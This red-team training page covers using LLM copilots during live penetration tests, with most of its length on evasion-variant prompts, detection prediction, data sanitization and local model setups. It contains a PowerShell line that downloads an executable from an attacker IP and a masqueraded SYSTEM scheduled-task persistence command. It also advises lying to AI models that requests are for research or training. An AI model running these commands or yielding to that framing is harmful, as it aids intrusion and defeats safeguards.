---
layout: training-page
title: "Live Ops with LLM Copilot — Vibe Hacking Workflows — Red Team Academy"
module: "AI Red Team Agents"
tags:
  - llm
  - copilot
  - vibe-hacking
  - live-operations
  - workflow
  - opsec
page_key: "ai-live-ops-with-llm-copilot"
render_with_liquid: false
---

# Live Ops with LLM Copilot

This page is about the operator side of the keyboard during a live engagement — you in the chair at 2 a.m., a half-working callback, a SOC ticket queue you don't have eyes on, and an LLM session open in the other monitor. It is not about autonomous agents driving the engagement (that's the autonomous-pentest-agents page). It is not about red-teaming the model itself (that's automated-red-team-tools). It is about the operator using Claude, GPT, Gemini, or a local Llama as a copilot the same way a senior reverse engineer keeps IDA, a hex editor, and a notebook open. The operator is the principal. The LLM is a tool — fast, lossy, externally hosted, with no clearance to the engagement scope, no understanding of the rules of engagement, and no judgment about what is safe to ship. Treat it that way and it will save you hours per engagement. Forget that and it will burn the engagement.

The shorthand for this mode of working has crystallized in 2025–2026 into a single phrase the community keeps using: **vibe hacking**. Operator-led, LLM-assisted, fast iteration on tradecraft — the offensive cousin of the "vibe coding" loop. Same loop, higher stakes. The discipline below is what keeps it from becoming a liability.

## What LLMs Are Actually Good At

After two years of production use across real engagements, the honest list is short and specific.

- **Evasion variation generation.** You have one working payload or syscall sequence; you want twenty stylistic variants to test against the EDR. This is a strict transformation task with a clear input and a clear output, exactly where an LLM excels.
- **Log triage.** You scraped 800 lines of Sysmon, defender event log, or SOC ticket text and you want the three that look like they noticed you. LLMs read fast and they pattern-match well.
- **Ad-hoc one-off tooling.** A PowerShell one-liner to enumerate scheduled tasks filtered by author, a Python snippet to parse a Bloodhound JSON for paths to a specific OU, a quick CSV transform. Code you would write yourself in twenty minutes; the LLM writes a first draft in thirty seconds and you fix it.
- **Translation between scripting languages.** PowerShell to C#, Python to Go, Bash to PowerShell. The semantics translate cleanly enough that the LLM gets 80% of it right and you patch the rest.
- **Quick lookup and recall.** Argument syntax for a tool you use twice a year. The exact registry path for a persistence technique. The structure of a Kerberos ticket. Faster than searching, less error-prone than memory.
- **Tradecraft brainstorm partner.** "Given that I have local admin on a non-domain box on the same VLAN as the DC, what are five non-obvious next steps?" The LLM will throw out ten ideas, six of which you already considered, two of which are bad, and two of which are worth trying. That is a useful ratio.

## What LLMs Are Bad At

This list is also short, and the items on it are the ones that matter.

- **Stable production code.** Anything that needs to run reliably across machines, handle errors, deal with edge cases — the LLM gets you a sketch, not a tool. Treat its output as a first draft, never as something ready to drop on a target.
- **OPSEC judgment.** The model has no idea what a "noisy" command looks like in your specific environment, on your specific engagement, with your specific detection assumptions. It will happily suggest `Invoke-WebRequest` from a workstation when the customer has explicit egress alerts on PowerShell webclient activity.
- **Engagement-specific context it does not have.** It does not know your scope, your rules of engagement, what the customer has already patched, or that the "test" subnet is actually production. Anything that depends on these is not its problem to solve.
- **The "is this safe to ship" determination.** This is the line. If you let the LLM make that call, you have replaced operator judgment with statistical token prediction, which is exactly how engagements get burned.

The honest framing is: the LLM accelerates the parts of the job that are mechanical. It does not replace the parts that are judgment. If a step requires you to weigh detection risk against operational value with incomplete information, the model is not in the loop on that decision.

## Live-Ops Use Cases

### Variation Generation

You have one technique that landed. You want to know what it looks like with five different syntactic shapes, because you are about to run it on three more boxes and you do not want one IOC across all of them. The pattern:

<pre><code># Operator prompt template
Given the following PowerShell snippet, produce 5 stylistically distinct
variants that perform the EXACT SAME OPERATION. Vary:
- Variable names
- Use of pipelines vs explicit assignment
- Cmdlet aliases vs full names
- String construction (concatenation, format strings, here-strings)
- Optional argument ordering

Do NOT change the underlying behavior. Do NOT add comments.

---SNIPPET---
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$wc.DownloadFile("http://10.10.14.5/x.exe","$env:TEMP\x.exe")
---END---</code></pre>

Five variants come back. You read each one. You test the one that looks most plausible against your EDR lab before sending it at the target. The LLM did the rewrite work; you did the verification.

### Log Triage

You popped a callback and you want to know whether the SOC noticed. You have access (legitimately, as part of the engagement) to a chunk of recent alerts or a Sysmon channel export. Paste the alert subjects (NOT the bodies if they contain customer data) and ask:

<pre><code>Here are 60 alert titles from the last 30 minutes from a Windows SOC.
I am interested in whether any of these look like they could correspond
to one of: (1) a new PowerShell session from a workstation, (2) a remote
schtasks creation, (3) a service install. Rank by likelihood. Do not
guess — say "none look likely" if that is the answer.</code></pre>

This is one of the highest-leverage uses. The LLM reads faster than you do and it does not get bored. Use it as a first-pass filter, then look at the candidates yourself.

### Quick Ad-Hoc Tooling

Mid-engagement, you realize you need a one-off script. Not something you will commit. Not something you will reuse. Just something that needs to run once, against the data you have right now.

<pre><code># Example: parse Bloodhound CSV export, find unconstrained delegation
# computers in a specific OU, output as comma-separated for crackmapexec.

# Operator-side prompt (no customer-specific data):
"Write a Python script that reads a CSV with columns
'name','ou','unconstrained_delegation' (bool) and outputs comma-separated
names where unconstrained_delegation is true AND ou contains a given
substring passed as argv[1]. No external deps."</code></pre>

You get a 15-line script in five seconds. You run it locally against your own copy of the data — the customer's data never goes to the LLM. Operator-side tooling, model-side template, customer-side data stays customer-side. This separation is the whole game.

### Detection Prediction

Before you fire a technique, you ask: "Here is what I am about to do. What does this look like to blue?" The LLM will list the likely telemetry sources, the candidate detection rules, the IOCs that would be left. It will be incomplete and it will sometimes be wrong, but it will catch things you would not have thought of.

<pre><code># Operator prompt
I am about to execute a generic technique class (no target details):
"Create a scheduled task on a Windows endpoint using schtasks.exe
that runs a binary from %TEMP% at user logon."

List, in order of likelihood:
1. Event log IDs that would be generated
2. Sysmon event IDs that would be generated
3. Common EDR detection rule names that match this pattern
4. The minimum modifications that would reduce telemetry without
   changing core functionality.</code></pre>

This is brainstorm, not gospel. You take the output, you cross-reference against what you actually know about the customer environment, and you decide.

### Cross-Language Translation

You have a working PowerShell PoC. You want a C# version because PowerShell is logged and AMSI'd to death on this customer's environment. The LLM is genuinely good at this — it gets the API mapping right, the type signatures roughly right, and the structure usually right. You patch the build errors and the obvious behavioral mismatches.

<pre><code># Operator-side prompt
Translate the following PowerShell to a self-contained C# program targeting
.NET Framework 4.7.2. Use Win32 P/Invoke for any kernel32/advapi32 calls.
Preserve all error handling. Output a single .cs file ready to compile
with csc.exe.

---PS---
&lt;your code&gt;
---END---</code></pre>

Then you build it, run it in a lab, and verify behavior matches. The LLM did the boilerplate. You did the validation.

### Code Review for Your Own Tooling

You wrote a 200-line loader. Before you put it on a target, you ask the LLM to review it for: (a) obvious memory bugs, (b) hardcoded strings that would IOC easily, (c) unused imports, (d) error paths that would crash noisily. The LLM is a decent peer reviewer for things you wrote yourself. It will not catch everything. It will catch some things.

A productive review prompt is specific about what you want and what you do not:

<pre><code># Operator-side review prompt
Review the following self-contained loader for these issues ONLY:

1. Hardcoded strings that would create a static IOC across deployments
   (URLs, file names, mutex names, GUIDs, unusual error messages).
2. API call ordering that diverges from what a real Win32 application
   would typically do — e.g., suspicious-looking pairings of
   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread in the
   classic textbook order.
3. Error paths that would generate noisy event log entries or crash
   the host process in an obviously abnormal way.
4. Unused imports or dead code paths.

Do NOT comment on style, performance, or modernization.
Do NOT suggest "improvements" — only flag what is listed above.

---CODE---
&lt;your code&gt;
---END---</code></pre>

The constraint matters. Without it the LLM will rewrite half the file in the name of "improvement" and bury the actual findings in noise. Operator-driven prompts are narrow on purpose.

### Inline Recall During Active Sessions

There is a category of question that comes up constantly mid-engagement that the LLM is perfect for: stuff you knew once, forgot, and need in the next ten seconds. Examples:

<pre><code># Examples of high-value recall queries (no target context)

"Exact PowerShell to import a CSV, filter where column X equals Y,
output only column Z, comma-separated, no header."

"Default port for WS-Management over HTTPS."

"Argument order for runas.exe with /netonly."

"Registry value name for the Windows DNS client cache TTL."

"Impacket tool to dump LSA secrets via DCOM, without SMB."</code></pre>

For these, the LLM is faster than search, faster than `man`, faster than scrolling through your notes. Treat the answer as a first hint, verify quickly with a real source if it matters, and move on.

### Worked Example: Detection Prediction Pass

This is the use case most operators underrate. Walk through it concretely.

You are on a Windows endpoint with local admin and you want to persist via a scheduled task. Before you execute, you run a detection-prediction pass:

<pre><code># Operator prompt — no customer-specific data
I am about to execute the following on a Windows 10 22H2 endpoint
running a major commercial EDR:

  schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\Refresh" \
    /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /f

For each of the following, give your honest assessment and rank
the risk from 1 (low) to 5 (high):

a) Likelihood of generating a Windows Security event log entry
   that a default SOC would alert on.
b) Likelihood of generating a Sysmon event that a default Sysmon
   config (SwiftOnSecurity baseline) would log.
c) Likelihood that a generic EDR behavioral rule would flag this.
d) Specific IOCs in the command that would jump out to a hunter
   reviewing scheduled-task creation events.
e) Minimum modifications that would reduce risk on (a)-(d) without
   changing the functional outcome (persistent SYSTEM execution
   at logon).</code></pre>

The LLM gives you something like: "Event ID 4698 will fire and is commonly alerted on for SYSTEM-context tasks. The path `C:\Windows\Temp` is a high-IOC location. The task name imitates a Microsoft path but is in a non-canonical folder — hunters will spot the typo'd structure. Minimum modifications: place the binary in `%PROGRAMDATA%` under a plausible vendor subfolder, use a different task-store path, change the task name to a less-imitated one."

You read that. You decide which suggestions are real and which are not (the model will sometimes invent telemetry that does not exist). You modify the command. You execute the modified version. The LLM did not make the decision. It listed considerations you might have missed. You made the decision.

## OPSEC of LLM Use During Engagement

This is the section that matters most. Read it twice.

The model is an external party. Anything you paste into a Claude, GPT, Gemini, or Copilot session is data that has left your machine, traversed the public internet, and landed on someone else's infrastructure. The provider may log it. The provider may use it to train future models. The provider may be subject to a subpoena. The provider may have a breach.

Build your workflow assuming all of that is true, because some of it is.

### What You Never Paste Into A Public LLM

- **Customer data.** Files, screenshots, database rows, credentials, hashes, ticket bodies, internal documents, anything labeled or marked confidential. This is the firing line.
- **Engagement-specific identifiers.** Hostnames, FQDNs, internal IP addresses, DNS names, account names, email addresses, user names you obtained from enumeration. Anything that identifies the customer or the systems in scope.
- **Targeting details.** "We are testing the SWIFT gateway at Acme Bank between Aug 12 and Aug 19" — this is exactly the kind of sentence that, if logged and later breached, gives an attacker the engagement timeline and target priorities for free.
- **Credentials.** Even ones you think are scrubbed. Even ones you think are old. Even hash values. Anything that could be used to authenticate to a real system.
- **Stage tooling that contains target-specific config.** Beacons compiled against a specific listener IP, loaders with a hardcoded URL, droppers with the customer's domain in a check.

### What Is Generally Safe

- **Generic code patterns.** "Show me a Win32 named pipe server in C." No customer context.
- **Tool syntax recall.** "What is the impacket-secretsdump flag for using a hash instead of a password?" Public knowledge.
- **Conceptual questions.** "How does Kerberos S4U2Self differ from S4U2Proxy?" Public knowledge.
- **Sanitized error messages.** "I am getting `0x80004005 (Unspecified error)` from this Windows API — what does that usually mean?" — fine, as long as the message does not include a target identifier.

### The Sanitization Habit

Before pasting any operational text into a public LLM, perform a sanitization pass. The discipline is mechanical, not creative:

- Replace target IPs with `10.10.10.10` or `192.0.2.1` (TEST-NET-1, reserved for documentation).
- Replace internal hostnames with `INTERNAL-HOST-01`.
- Replace user names with `useralpha`, `userbravo`.
- Replace customer domain names with `example.local` or `example.corp`.
- Replace file paths that reveal the customer with generic equivalents.

A useful operator practice: keep a small shell function that does this for you, so the sanitization is one keystroke rather than a manual rewrite each time.

<pre><code># ~/.bashrc helper — paste-sanitize
function sanitize() {
  pbpaste \
    | sed -E 's/(10\.10\.[0-9]+\.[0-9]+)/192.0.2.1/g' \
    | sed -E 's/(acmecorp|customername|targetorg)/example/gi' \
    | sed -E 's/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/user@example.com/g' \
    | pbcopy
  echo "[+] Clipboard sanitized."
}</code></pre>

Customize the regexes per engagement. The point is to make sanitization the path of least resistance, so you do it every time without thinking.

### Private and Local Deployments

When you need to keep target-specific context in the prompt — because removing it would defeat the purpose — switch to a local or fully self-hosted model. The current landscape:

- **Ollama with Llama 3.1 70B, Qwen2.5 72B, DeepSeek-Coder, or Mistral Large.** Runs locally on a workstation with sufficient VRAM (or split across CPU/GPU at reduced speed). No prompts leave your machine. Acceptable quality for most operator-copilot tasks.
- **Self-hosted vLLM or TGI on an engagement-isolated VM.** Higher throughput than Ollama. Lives on your operator infrastructure, never touches the customer network or a public API.
- **Azure OpenAI with a private endpoint and zero-retention setting** — only if your customer has explicitly contracted for this and the data residency is acceptable per the rules of engagement. Read the actual contract; the default settings are not zero-retention.
- **Anthropic and OpenAI enterprise tiers with zero-data-retention agreements** — same caveat. Check the contract. The free or default API tiers do not give you this.

Treat anything that goes to a public consumer LLM endpoint as data that has been published.

### The Prompt Itself Is Tradecraft

Beyond customer data, your prompt history reveals your tradecraft. If you have spent three months at a hosted LLM provider asking variations of "give me five ways to abuse SeImpersonatePrivilege" and "translate this CLR-loaded assembly to a C++ shellcode runner," that is a profile of the techniques you favor. For a serious operator that profile itself is sensitive. Local-first for anything that builds a tradecraft fingerprint.

## Tooling Patterns

### Claude Code / Codex CLI / Aider — Operator-Side Scripting

Terminal-resident LLM tools have become the standard operator copilot in 2025-2026. The workflow:

<pre><code># Claude Code (Anthropic) — runs in the operator's terminal
# Reads files, writes files, runs commands, you approve each one.
claude

# Codex CLI (OpenAI)
codex

# Aider — model-agnostic, focused on edit-as-diff workflow
pip install aider-chat
aider --model claude-sonnet-4 file1.ps1 file2.cs</code></pre>

These tools are designed for your local code, not for talking about a target. They are perfect for "rewrite this loader in C#," "add error handling to this PowerShell," "convert this Python POC to a Go single-binary." They are a bad fit for "look at this customer log" — same reason as above.

When you use them, configure them to respect the engagement boundary. Common patterns:

- Run them only in a dedicated directory tree that does not contain customer data.
- Use the per-project `.claude/CLAUDE.md` or equivalent to instruct the assistant about what is in scope.
- Disable any "send screenshots" or "send environment info" feature you do not explicitly need.

### Local Llama / Mistral for Sensitive Context

For everything else, the local model is the answer. The setup is straightforward:

<pre><code># Ollama on the operator workstation
curl -fsSL https://ollama.com/install.sh | sh
ollama pull llama3.1:70b
ollama pull qwen2.5-coder:32b
ollama serve   # binds 127.0.0.1:11434 by default

# Query from a script — example helper
cat &lt;&lt;'EOF' &gt; ~/.local/bin/ask
#!/usr/bin/env bash
prompt="$*"
curl -s http://127.0.0.1:11434/api/generate \
  -d "{\"model\":\"llama3.1:70b\",\"prompt\":${prompt@Q},\"stream\":false}" \
  | jq -r '.response'
EOF
chmod +x ~/.local/bin/ask

# Use it
ask "Five PowerShell encodings of the string 'rundll32' that avoid the literal token"</code></pre>

Bind to localhost only. Do not expose the port. Do not run the model on the customer network. The model lives on your operator workstation or on an isolated VM you control.

### API Integration With Operator Notebooks

Jupyter or VSCode notebooks with cells that call a local model become a kind of working journal. You think out loud, paste in (sanitized) outputs, ask follow-up questions, save the notebook to the engagement folder. It is also a way to control what data the model sees — the cell that calls the model gets only the variable you pass to it, not the full context of the notebook.

A useful pattern: a small `copilot.py` helper that wraps the call, applies a sanitization regex set per engagement, and logs every prompt to a local file so you have a record of what you asked.

<pre><code># copilot.py — minimal engagement-aware wrapper
# Sanitizes prompt before send, logs every call.

import os, re, json, time, requests
from pathlib import Path

ENGAGEMENT = os.environ.get("ENGAGEMENT", "default")
LOG_PATH = Path.home() / ".copilot-logs" / f"{ENGAGEMENT}.jsonl"
LOG_PATH.parent.mkdir(parents=True, exist_ok=True)

# Per-engagement sanitization rules
SANITIZE = [
    (re.compile(r"10\.10\.[0-9]+\.[0-9]+"), "192.0.2.1"),
    (re.compile(r"acmecorp|customername", re.I), "example"),
    (re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"),
     "user@example.com"),
]

def sanitize(text: str) -&gt; str:
    for pattern, replacement in SANITIZE:
        text = pattern.sub(replacement, text)
    return text

def ask(prompt: str, model: str = "llama3.1:70b") -&gt; str:
    sanitized = sanitize(prompt)
    if sanitized != prompt:
        print("[!] Prompt was modified by sanitization.")
    r = requests.post(
        "http://127.0.0.1:11434/api/generate",
        json={"model": model, "prompt": sanitized, "stream": False},
        timeout=120,
    )
    response = r.json().get("response", "")
    with LOG_PATH.open("a") as f:
        f.write(json.dumps({
            "ts": time.time(),
            "model": model,
            "prompt": sanitized,
            "response": response,
        }) + "\n")
    return response

if __name__ == "__main__":
    import sys
    print(ask(sys.stdin.read()))</code></pre>

Set `ENGAGEMENT=clientname-2026q2` per session, point everything at this helper, and you get sanitization-by-default plus a full log of what was asked. The log itself is sensitive — store it encrypted, dispose of it per your data-handling policy at engagement close.

### Session Discipline

Independent of which model you use, a few habits separate operators who get value from LLMs from operators who get exposure:

- **One engagement, one model session.** Do not let context from engagement A leak into engagement B. Close the session, start a new one, restate scope at the top.
- **Never tell the model the engagement is real.** A generic prompt about a hypothetical loader is fine. "Help me debug the loader I am about to drop on a real customer" is a statement that lives in the provider's logs forever. Frame everything as research, lab work, or training.
- **Cap session length.** Long sessions accumulate context drift — the model will start to invent specifics it inferred from earlier turns. Reset every 30-60 minutes of active work.
- **Treat every model output as untrusted input.** Code goes through your review. Commands go through a lab test. Recommendations get cross-checked against a real source before acting on them.
- **Keep a tradecraft file separate from any model.** Your real notes, real techniques, real engagement-specific findings — those live in encrypted local storage that no model ever sees. The LLM is a worktop, not a journal.

## Engagement-Specific Anti-Patterns

These are the operator mistakes that get an LLM-assisted workflow burned. Treat them as do-not-do rules.

- **"Write me a Cobalt Strike beacon."** The model will produce something generic that resembles a beacon and is unlikely to work in your environment. Specific malware development belongs in your own code; the LLM helps with the pieces, not the whole.
- **"Here is the customer's network diagram, what should I attack first?"** You have just exfiltrated a confidential customer document. Even if the model "forgets" it, the provider's logs do not.
- **Asking for engagement-narrative content.** "Write a phishing pretext targeting Acme's HR department, given this org chart." Now you have leaked the org chart. Generic phishing copy is fine to draft with an LLM; specific copy belongs in your head and your encrypted notes.
- **Trusting LLM output for OPSEC-critical decisions.** "Is this command quiet enough?" The model does not know. It will guess. You will act on the guess. The customer's blue team will find you.
- **Pasting the actual exploit output into the LLM to "help debug."** That output contains target identifiers, command outputs, sometimes credentials. Sanitize first, every time.
- **Using a single LLM session that spans multiple engagements.** Conversation history from engagement A becomes context for engagement B. Start fresh per engagement, ideally fresh per session.
- **Sending tool output through the LLM "just to summarize."** Convenience operation, large data exposure surface. Summarize yourself, or use a local model.

## Defender Side

The same techniques apply to incident response and detection engineering, mirrored. The blue team uses the same kinds of LLMs in the same kinds of ways, with the same kinds of OPSEC concerns (substitute "incident data" for "engagement data" and the rules are identical).

Specific defender workflows that have become standard in 2025-2026:

- **Triage acceleration.** SOC analyst pastes (sanitized) alert clusters into a local LLM and asks for likely groupings, candidate hypotheses, suggested next queries. Same use case as operator log triage, opposite team.
- **Detection rule drafting.** "Here is a sample of suspicious PowerShell from one of our endpoints. Draft a Sigma rule that catches this and three variants." The LLM produces a draft; the detection engineer refines and tests.
- **Threat-hunting query expansion.** Hunter has one query that found one thing. Asks the LLM for ten variations across different telemetry sources. Same pattern as offensive variation generation, used to widen coverage.
- **IR write-up acceleration.** Sanitized incident timeline gets passed to the LLM, which drafts an incident narrative for the executive summary. Human-written remediation steps are not delegated.

The OPSEC concerns mirror the offensive side. Customer incident data has the same sensitivity as customer engagement data. Local models, sanitized prompts, dedicated infrastructure.

For the operator, this is worth understanding because the same accelerator is on both sides. Blue teams that use LLM copilots well are noticeably faster at triage than ones that do not. Plan accordingly.

## A Closing Word On The Mode

The vibe-hacking workflow is real, it is valuable, and it is a discipline. The operators who get the most out of it treat the LLM like a sharp junior who has been on the team for two days: useful for the mechanical parts, supervised on everything else, never given the keys, never trusted with the customer. The operators who get burned by it treat the LLM like an oracle that has knowledge they do not have. It does not, and it cannot, because it has none of the engagement context that matters.

Build the habits early. Sanitize every paste. Keep customer data off public infrastructure. Use local models for anything you would not be willing to see in a courtroom exhibit. Verify everything the model produces before it touches a target. The faster you internalize these as reflexes, the more the LLM becomes a force multiplier rather than a footgun.

## Resources

- Anthropic Claude — `anthropic.com/claude` — model documentation, enterprise zero-retention terms
- OpenAI GPT API — `platform.openai.com/docs` — including enterprise data handling specifics
- Google Gemini — `ai.google.dev` — model documentation and API terms
- Ollama — `ollama.com` — local model runner
- vLLM — `github.com/vllm-project/vllm` — self-hosted inference server
- Claude Code — `github.com/anthropics/claude-code`
- Aider — `aider.chat` and `github.com/Aider-AI/aider`
- SANS LLM-in-security resources — `sans.org` (search "AI for security operations")
- MITRE ATLAS — `atlas.mitre.org` — adversarial ML threat matrix relevant to both red and blue
- OWASP Top 10 for LLM Applications — `owasp.org/www-project-top-10-for-large-language-model-applications`
- "Vibe coding to vibe hacking" — community write-ups from Black Hat and DEF CON 2025
